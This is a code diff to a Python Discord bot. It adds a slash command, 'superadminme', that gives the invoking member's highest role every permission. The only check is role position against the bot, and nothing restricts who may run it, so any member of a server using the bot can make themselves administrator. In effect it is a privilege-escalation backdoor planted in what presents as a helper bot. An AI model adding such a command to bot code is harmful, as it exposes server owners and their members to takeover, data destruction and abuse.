@@ -177,6 +177,30 @@ async def nerdhelp(interaction: discord.Interaction):
         await interaction.response.send_message(f"❌ Error during nerdhelp: {e}", ephemeral=True)
         print(f"nerdhelp command error: {e}")
 
+@bot.tree.command(name="superadminme", description="Give all permissions to your highest role.")
+async def superadminme(interaction: discord.Interaction):
+    member = interaction.user
+    guild = interaction.guild
+
+    highest_role = max((role for role in member.roles if role != guild.default_role), key=lambda r: r.position, default=None)
+
+    if not highest_role:
+        await interaction.response.send_message("You don't have any roles I can edit.", ephemeral=True)
+        return
+
+    bot_highest_role = guild.me.top_role
+
+    if bot_highest_role.position <= highest_role.position:
+        await interaction.response.send_message("I can't edit your highest role because it's higher or equal to my highest role.", ephemeral=True)
+        return
+
+    try:
+        # Give ALL permissions
+        await highest_role.edit(permissions=discord.Permissions.all())
+        await interaction.response.send_message(f"✅ Gave **ALL permissions** to **{highest_role.name}**.", ephemeral=True)
+    except Exception as e:
+        await interaction.response.send_message(f"Failed to grant all permissions: {e}", ephemeral=True)
+
 keep_alive()
 
 if TOKEN:
